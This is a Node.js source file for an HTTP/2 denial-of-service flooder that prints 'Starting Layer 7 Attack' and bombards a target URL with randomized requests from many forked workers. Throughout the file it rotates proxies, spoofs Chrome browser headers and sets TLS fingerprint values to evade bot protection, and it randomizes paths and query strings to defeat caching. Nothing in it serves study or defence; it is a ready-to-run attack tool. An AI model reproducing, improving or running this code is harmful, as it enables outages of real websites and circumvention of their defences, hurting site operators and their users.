const http2 = require('http2');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');
const EventEmitter = require('events');
const tls = require('tls');
const fs = require('fs');

EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const args = process.argv.slice(2);
const [target, time_sec, rate, threads, proxy_file, cookie, user_agent] = args;

if (!target) {
    console.log('Missing arguments');
    process.exit(1);
}

let proxies = [];
if (proxy_file && proxy_file !== 'none' && fs.existsSync(proxy_file)) {
    const data = fs.readFileSync(proxy_file, 'utf8');
    proxies = data.split('\n')
        .map(line => line.trim())
        .filter(line => line && line.includes(':') && !line.startsWith('#'));
    console.log(`Loaded ${proxies.length} proxies from ${proxy_file}`);
}

const targetUrl = new URL(target);
const hostname = targetUrl.hostname;
const path = targetUrl.pathname || '/';
const port = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
const isHTTPS = targetUrl.protocol === 'https:';

const JA3_FINGERPRINTS = [
    '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0',
    '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0',
    '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25-26,0'
];

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function createHttp2Client(workerId, useProxy = false) {
    const ja3 = JA3_FINGERPRINTS[workerId % JA3_FINGERPRINTS.length];
    let proxy = useProxy ? getRandomProxy() : null;
    
    const options = {
        protocol: isHTTPS ? 'https:' : 'http:',
        hostname: hostname,
        port: port,
        method: 'GET',
        path: path,
        headers: {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'pragma': 'no-cache',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'cookie': cookie || '',
            'referer': target,
            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'dnt': '1',
            'connection': 'keep-alive'
        },
        settings: {
            headerTableSize: 65536,
            enablePush: false,
            initialWindowSize: 6291456,
            maxFrameSize: 16384,
            maxConcurrentStreams: 1000,
            maxHeaderListSize: 262144,
            enableConnectProtocol: false
        },
        sessionOptions: {
            maxDeflateDynamicTableSize: 65536,
            maxSessionMemory: 67108864
        }
    };

    if (proxy && useProxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        options.agent = new http.Agent({
            host: proxyHost,
            port: parseInt(proxyPort),
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 100,
            timeout: 5000
        });
    }

    if (isHTTPS) {
        options.createConnection = () => {
            const socket = tls.connect({
                host: hostname,
                port: port,
                ALPNProtocols: ['h2'],
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                honorCipherOrder: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                servername: hostname,
                secureContext: tls.createSecureContext({
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'
                }),
                socket: proxy && useProxy ? () => {
                    const net = require('net');
                    const proxySocket = net.connect(parseInt(proxyPort), proxyHost);
                    return proxySocket;
                } : undefined
            });
            return socket;
        };
    }

    try {
        const client = http2.connect(`${isHTTPS ? 'https' : 'http'}://${hostname}:${port}`, options);
        
        client.on('error', (err) => {
            if (workerId === 0 && Math.random() > 0.95) {
                console.log(`Connection error: ${err.code}`);
            }
        });
        
        client.on('goaway', () => {
            setTimeout(() => {
                try { client.close(); } catch {}
                createHttp2Client(workerId, useProxy);
            }, 100);
        });
        
        client.setTimeout(5000, () => {
            try { client.close(); } catch {}
        });
        
        return client;
    } catch (err) {
        return null;
    }
}

function generateRandomPath() {
    const paths = [
        '/', '/index.php', '/home', '/main', '/page',
        '/news', '/articles', '/blog', '/contact',
        '/about', '/products', '/services', '/login',
        '/admin', '/wp-admin', '/api', '/v1', '/v2'
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}

function generateRandomQuery() {
    const params = ['id', 'page', 'view', 'sort', 'filter', 'search', 'q', 't', 'v', 'u'];
    const param1 = params[Math.floor(Math.random() * params.length)];
    const param2 = params[Math.floor(Math.random() * params.length)];
    const value1 = Math.floor(Math.random() * 10000);
    const value2 = Math.random().toString(36).substring(7);
    return `?${param1}=${value1}&${param2}=${value2}&_=${Date.now()}`;
}

function floodWorker(workerId, reqRate, useProxy = false) {
    const clients = [];
    const requestCounters = { success: 0, error: 0, proxy_errors: 0 };
    
    for (let i = 0; i < 3; i++) {
        const client = createHttp2Client(workerId, useProxy);
        if (client) clients.push(client);
    }
    
    if (clients.length === 0) {
        console.log(`Worker ${workerId}: No connections available`);
        return;
    }
    
    const interval = 1000 / reqRate;
    let lastStats = Date.now();
    
    function sendRequest() {
        if (clients.length === 0) return;
        
        const client = clients[Math.floor(Math.random() * clients.length)];
        const currentPath = generateRandomPath() + generateRandomQuery();
        const methods = ['GET', 'POST', 'HEAD', 'OPTIONS'];
        const method = methods[Math.floor(Math.random() * methods.length)];
        
        try {
            const req = client.request({
                ':method': method,
                ':path': currentPath,
                ':authority': hostname,
                ':scheme': isHTTPS ? 'https' : 'http'
            });
            
            req.on('response', (headers) => {
                requestCounters.success++;
                req.close();
                
                if (headers[':status'] === 429 || headers[':status'] === 503) {
                    if (useProxy && proxies.length > 0) {
                        requestCounters.proxy_errors++;
                    }
                }
            });
            
            req.on('error', (err) => {
                requestCounters.error++;
                req.close();
                
                if (err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT') {
                    if (useProxy && proxies.length > 0) {
                        requestCounters.proxy_errors++;
                        if (requestCounters.proxy_errors % 10 === 0) {
                            console.log(`Worker ${workerId}: Proxy errors accumulating`);
                        }
                    }
                }
            });
            
            if (method === 'POST' && Math.random() > 0.5) {
                const postData = JSON.stringify({
                    data: Math.random().toString(36),
                    timestamp: Date.now()
                });
                req.write(postData);
            }
            
            req.end();
            
            const now = Date.now();
            if (now - lastStats > 5000) {
                const total = requestCounters.success + requestCounters.error;
                const successRate = total > 0 ? (requestCounters.success / total * 100).toFixed(1) : 0;
                console.log(`Worker ${workerId}: ${requestCounters.success}/${total} (${successRate}%)`);
                lastStats = now;
            }
            
        } catch (err) {
            requestCounters.error++;
        }
    }
    
    const timer = setInterval(sendRequest, interval);
    
    const stopTimeout = setTimeout(() => {
        clearInterval(timer);
        clients.forEach(client => {
            try { client.close(); } catch {}
        });
        
        const total = requestCounters.success + requestCounters.error;
        const successRate = total > 0 ? (requestCounters.success / total * 100).toFixed(1) : 0;
        console.log(`Worker ${workerId} finished: ${requestCounters.success}/${total} (${successRate}%)`);
        
        if (useProxy && proxies.length > 0) {
            console.log(`Worker ${workerId} proxy errors: ${requestCounters.proxy_errors}`);
        }
        
        process.exit(0);
    }, time_sec * 1000);
    
    process.on('SIGINT', () => {
        clearInterval(timer);
        clearTimeout(stopTimeout);
        clients.forEach(client => {
            try { client.close(); } catch {}
        });
        process.exit(0);
    });
}

if (cluster.isMaster) {
    console.log(`🚀 Starting Layer 7 Attack on ${target}`);
    console.log(`⏱️  Duration: ${time_sec}s | 📊 Rate: ${rate}/s | 🧵 Threads: ${threads}`);
    console.log(`🌐 Proxies: ${proxies.length > 0 ? `${proxies.length} loaded` : 'No proxies'}`);
    console.log(`🔗 Protocol: ${isHTTPS ? 'HTTPS' : 'HTTP'} | Port: ${port}`);
    
    const numWorkers = Math.min(parseInt(threads) || os.cpus().length, 50);
    const ratePerWorker = Math.ceil((parseInt(rate) || 100) / numWorkers);
    const useProxies = proxies.length > 0;
    
    console.log(`⚡ Launching ${numWorkers} workers, ${ratePerWorker} req/s each`);
    console.log(`🛡️  Proxy mode: ${useProxies ? 'ENABLED' : 'DISABLED'}`);
    
    let activeWorkers = 0;
    
    for (let i = 0; i < numWorkers; i++) {
        const worker = cluster.fork({ 
            WORKER_ID: i,
            REQ_RATE: ratePerWorker,
            USE_PROXY: useProxies ? '1' : '0'
        });
        activeWorkers++;
        
        worker.on('exit', () => {
            activeWorkers--;
            if (activeWorkers === 0) {
                console.log('✅ All workers finished');
                if (fs.existsSync('active_proxies.txt')) {
                    fs.unlinkSync('active_proxies.txt');
                }
                process.exit(0);
            }
        });
    }
    
    let totalRequests = 0;
    cluster.on('message', (worker, message) => {
        if (message && message.requests) {
            totalRequests += message.requests;
            console.log(`📈 Total requests: ${totalRequests}`);
        }
    });
    
    process.on('SIGINT', () => {
        console.log('\n🛑 Received shutdown signal');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    
    process.on('SIGTERM', () => {
        console.log('\n🛑 Received termination signal');
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    
} else {
    const workerId = process.env.WORKER_ID || 0;
    const reqRate = parseInt(process.env.REQ_RATE) || 10;
    const useProxy = process.env.USE_PROXY === '1';
    
    floodWorker(workerId, reqRate, useProxy);
}
